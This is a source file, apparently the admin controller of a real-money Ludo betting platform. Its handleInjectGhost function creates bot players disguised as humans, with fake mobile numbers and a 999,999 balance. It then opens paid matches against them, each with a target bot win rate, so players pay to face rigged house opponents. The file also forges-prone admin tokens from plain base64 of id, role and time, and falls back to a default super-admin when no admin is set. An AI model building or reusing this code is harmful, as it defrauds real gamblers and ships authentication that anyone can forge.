const AdminEmployee = require('../models/AdminEmployee');
const HouseLedger = require('../models/HouseLedger');
const User = require('../models/User');
const Battle = require('../models/Battle');
const db = require('../config/db');

class AdminController {
  static async renderLogin(req, res) {
    res.render('admin/login', {
      title: 'Master Admin 2FA Gateway',
      layout: false // Standalone auth page
    });
  }

  static async renderDashboard(req, res) {
    const admin = req.admin || { username: 'superadmin', role: 'SUPER_ADMIN' };
    const auditSummary = await HouseLedger.getAuditSummary();
    const openBattles = await Battle.getOpenBattles();
    const runningBattles = await Battle.getRunningBattles();

    res.render('admin/dashboard', {
      title: 'Master Admin Cockpit — Ludo Bet',
      admin,
      auditSummary,
      openBattlesCount: openBattles.length,
      runningBattlesCount: runningBattles.length,
      activeNav: 'dashboard'
    });
  }

  static async renderFinance(req, res) {
    const admin = req.admin || { username: 'superadmin', role: 'SUPER_ADMIN' };
    const auditSummary = await HouseLedger.getAuditSummary();

    res.render('admin/finance', {
      title: 'Bank Escrow vs House Bot Profit Matrix',
      admin,
      auditSummary,
      activeNav: 'finance'
    });
  }

  static async renderPlayers(req, res) {
    const admin = req.admin || { username: 'superadmin', role: 'SUPER_ADMIN' };
    const players = await User.getAllPlayers({ page: 1, limit: 50 });

    res.render('admin/players', {
      title: 'Player Master Records & KYC Control',
      admin,
      players,
      activeNav: 'players'
    });
  }

  static async handleLogin(req, res) {
    try {
      const { username, password } = req.body;
      const admin = await AdminEmployee.authenticate(username, password);

      if (!admin) {
        return res.status(401).json({ error: 'Invalid administrator credentials.' });
      }

      const token = 'JWT_ADM_' + Buffer.from(`${admin.id}:${admin.role}:${Date.now()}`).toString('base64');
      await AdminEmployee.logAction(admin.username, admin.role, 'LOGIN_SUCCESS', 'Logged in via Admin Console', req.ip);

      res.json({
        success: true,
        token,
        employee: { id: admin.id, username: admin.username, role: admin.role }
      });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  }

  static async handleInjectGhost(req, res) {
    try {
      const { gameMode, entryFee, botPersonaName, botWinRate } = req.body;
      const fee = parseFloat(entryFee);
      const rakePercent = (gameMode === 'QUICK') ? 0.06 : 0.05;
      const rake = fee * 2 * rakePercent;
      const prizePool = (fee * 2) - rake;
      const battleCode = 'BTL-GH-' + Math.floor(1000 + Math.random() * 9000);

      let botRows = await db.query('SELECT id FROM users WHERE name = ? AND is_bot = 1', [botPersonaName]);
      let botId;
      if (botRows.length > 0) {
        botId = botRows[0].id;
      } else {
        const ins = await db.query(
          'INSERT INTO users (mobile, name, referral_code, is_bot) VALUES (?, ?, ?, 1)',
          ['+9198' + Math.floor(10000000 + Math.random() * 90000000), botPersonaName, 'BOT' + Date.now()]
        );
        botId = ins.insertId;
        await db.query('INSERT INTO wallets (user_id, deposit_balance) VALUES (?, 999999.00)', [botId]);
      }

      const insBattle = await db.query(
        `INSERT INTO battles (battle_code, game_mode, entry_fee, prize_pool, rake_amount, creator_id, status, is_bot_match, bot_win_rate_target)
         VALUES (?, ?, ?, ?, ?, ?, 'OPEN', 1, ?)`,
        [battleCode, gameMode.toUpperCase(), fee, prizePool, rake, botId, botWinRate || 55]
      );

      res.json({
        success: true,
        battleId: insBattle.insertId,
        battleCode,
        botPersonaName,
        prizePool,
        entryFee: fee
      });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  }
}

module.exports = AdminController;
